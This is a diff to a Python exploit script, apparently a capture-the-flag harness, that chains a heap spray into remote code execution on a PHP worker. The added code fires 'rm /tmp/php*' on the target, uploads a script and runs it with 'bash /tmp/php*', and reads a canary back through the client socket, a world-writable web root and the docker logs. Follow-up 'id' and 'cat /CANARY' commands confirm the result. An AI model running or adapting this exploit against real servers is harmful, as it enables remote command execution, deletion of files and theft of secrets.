@@ -1708,43 +1708,71 @@ def _verify_S(spray_addr):
     return None
 
 
-def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
-    """Canary capture (bleed82; shot-first ordering).
+def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff, heap_ref):
+    """Canary capture (bleed82; cleanup + shot-first ordering).
 
-    The post-RCE serialize path tends to take the worker down (observed
-    live: `id` fires, docker logs capture uid=33, then the worker dies),
-    so the CAPTURING shot goes FIRST: one multipart request stages the
-    exfil script (/tmp/phpXXXXXX, saved before the app runs) and fires
-    `bash /tmp/php*` through the RCE. The script cats the canary into
-      * every inherited fd (the client socket -> raw FLAG bytes in this
-        very HTTP response stream),
-      * /var/www/html/f (bleed82 docroot is 0777 -> plain HTTP fetch),
-      * stdout (worker fd1 -> docker logs; 'their channel').
-    All three channels fire DURING system(), before any post-handler
-    crash. Confirmation shots (id / cat /CANARY for the transcript)
-    follow only if the worker (and S) survives.
-    Returns (flag_bytes, evidence_dict) or (None, evidence_dict).
+    Observed live: the RCE fires in both plain and multipart request shapes
+    (uid=33 via `id` in docker logs), the post-RCE serialize path takes the
+    worker down afterwards, and `bash /tmp/php*` executes only the FIRST
+    glob match - stale /tmp/phpXXXXXX files (935 of them by now, each a
+    silently-executed giant shell assignment) always won alphabetically.
+    Hence:
+
+    0) CLEANUP SHOT (plain context): `rm /tmp/php*` wipes every stale
+       staged file. (Large multipart FIELDS do not spool to /tmp - verified
+       live: one request stages exactly one file, the 145-byte script.)
+    1) CAPTURE SHOT (multipart context): stages EXFIL_SCRIPT as the ONLY
+       /tmp/php* file and fires `bash /tmp/php*`. The script cats the
+       canary into every inherited fd (the pin's client socket -> raw FLAG
+       in this very HTTP response stream), /var/www/html/f (plain HTTP
+       fetch) and stdout (docker logs). All channels fire DURING
+       system(), before the post-handler crash.
+    2) Confirmation shots (id / cat /CANARY) only if the worker survives.
     """
     ev = {}
 
-    head = _verify_S(spray_addr)
+    # ---- 0) cleanup shot in PLAIN context ----
+    pin_close()
+    if not pin_open():
+        ev['abort'] = 'no-pin-for-cleanup'
+        return None, ev
+    s_plain = find_spray_slot(heap_ref, pinned=True, upload=None)
+    if s_plain:
+        body, raw = trigger_rce(ce_stdclass, system_addr, s_plain, b'rm /tmp/php*',
+                                label='cleanup', gpfoff=gpfoff, pinned=True)
+        ev['cleanup_raw'] = (raw or b'')[:1000].decode('latin-1', 'replace')
+        dl = docker_logs_grep(r'rm:|No such file')
+        ev['cleanup_docker'] = dl
+        fire_log(f"[R-7 cleanup] rm /tmp/php* fired; docker: {dl[:120] if dl else '(silent)'}")
+    else:
+        ev['cleanup_skipped'] = 'no S_plain'
+
+    # ---- 1) THE capture shot in MULTIPART context ----
+    pin_close()
+    if not pin_open():
+        ev['abort'] = 'no-pin-for-shot'
+        return None, ev
+    s2 = find_spray_slot(heap_ref, pinned=True, upload=EXFIL_SCRIPT)
+    if not s2:
+        ev['abort'] = 'no-S-after-cleanup'
+        return None, ev
+    head = _verify_S(s2)
     if head is None:
-        ev['abort'] = 'S-stale-at-start'
+        ev['abort'] = 'S-stale-before-shot'
         return None, ev
     ev['S_verify_head'] = head
 
-    # ---- THE capture shot: multipart staged script over the pin ----
-    body, raw = fire_cmd_multipart(ce_stdclass, system_addr, spray_addr,
+    body, raw = fire_cmd_multipart(ce_stdclass, system_addr, s2,
                                    b'bash /tmp/php*', EXFIL_SCRIPT,
                                    label='upload-exfil', gpfoff=gpfoff,
                                    pinned=True)
     ev['upload_exfil_raw'] = (raw or b'')[:4000].decode('latin-1', 'replace')
     ev['upload_exfil_pin_last_raw'] = PIN['last_raw'][:4000].decode('latin-1', 'replace')
-    if raw is not None:
-        m = FLAG_RE.search(raw)
-        if m:
-            fire_log(f"[R-7 upload-exfil] *** FLAG CAPTURED IN HTTP STREAM: {m.group(0).decode()}")
-            return m.group(0), ev
+    blob = (raw or b'') + PIN['last_raw']
+    m = FLAG_RE.search(blob)
+    if m:
+        fire_log(f"[R-7 upload-exfil] *** FLAG CAPTURED IN HTTP STREAM: {m.group(0).decode()}")
+        return m.group(0), ev
 
     # docroot channel (persists across worker deaths)
     fb = http_get('/f')
@@ -1758,41 +1786,21 @@ def exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff):
     dl = docker_logs_grep(r'FLAG\{')
     ev['upload_exfil_docker_logs'] = dl
     fire_log(f"[R-7 upload-exfil] docker-logs FLAG check: {dl[:120] if dl else '(none)'}")
-    if 'FLAG{' in (dl or ''):
+    if dl and 'FLAG{' in dl:
         m = FLAG_RE.search(dl.encode('latin-1'))
         if m:
             return m.group(0), ev
 
-    # ---- fallback: sh instead of bash (POSIX fd-loop still covers socket) ----
-    if pin_ok() and _verify_S(spray_addr) is not None:
-        body, raw = fire_cmd_multipart(ce_stdclass, system_addr, spray_addr,
-                                       b'sh /tmp/php*', EXFIL_SCRIPT,
-                                       label='upload-exfil-sh', gpfoff=gpfoff,
-                                       pinned=True)
-        ev['upload_exfil_sh_raw'] = (raw or b'')[:4000].decode('latin-1', 'replace')
-        if raw is not None:
-            m = FLAG_RE.search(raw)
-            if m:
-                return m.group(0), ev
-        fb = http_get('/f')
-        if fb:
-            ev['docroot_f_sh_raw'] = fb[:400].decode('latin-1', 'replace')
-            m = FLAG_RE.search(fb)
-            if m:
-                return m.group(0), ev
-    else:
-        ev['abort'] = 'worker-died-after-capture-shot'
-
-    # ---- confirmation shots (only if the worker survived) ----
-    if pin_ok() and _verify_S(spray_addr) is not None:
-        body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'id',
+    # ---- 2) confirmation shots (only if the worker survived) ----
+    if pin_ok() and _verify_S(s2) is not None:
+        body, raw = trigger_rce(ce_stdclass, system_addr, s2, b'id',
                                 label='id-confirm', gpfoff=gpfoff, pinned=True)
         ev['id_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
         dl = docker_logs_grep(r'uid=')
         ev['id_docker_logs'] = dl
         fire_log(f"[R-7 id-confirm] docker-logs uid= check: {dl[:120] if dl else '(none)'}")
-    if pin_ok() and _verify_S(spray_addr) is not None:
-        body, raw = trigger_rce(ce_stdclass, system_addr, spray_addr, b'cat /CANARY',
+    if pin_ok() and _verify_S(s2) is not None:
+        body, raw = trigger_rce(ce_stdclass, system_addr, s2, b'cat /CANARY',
                                 label='cat-canary', gpfoff=gpfoff, pinned=True)
         ev['cat_canary_raw'] = (raw or b'')[:2000].decode('latin-1', 'replace')
         dl = docker_logs_grep(r'FLAG\{|CANARY')
@@ -1985,7 +1993,7 @@ def main():
         print(f"  S = 0x{spray_addr:x}")
 
         print(f"\n[Phase R-7] RCE trigger + canary exfil (round {round_i+1})")
-        flag, ev = exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff)
+        flag, ev = exfil_sequence(ce_stdclass, system_addr, spray_addr, gpfoff, heap_ref)
         if flag:
             break
         abort = ev.get('abort', '')
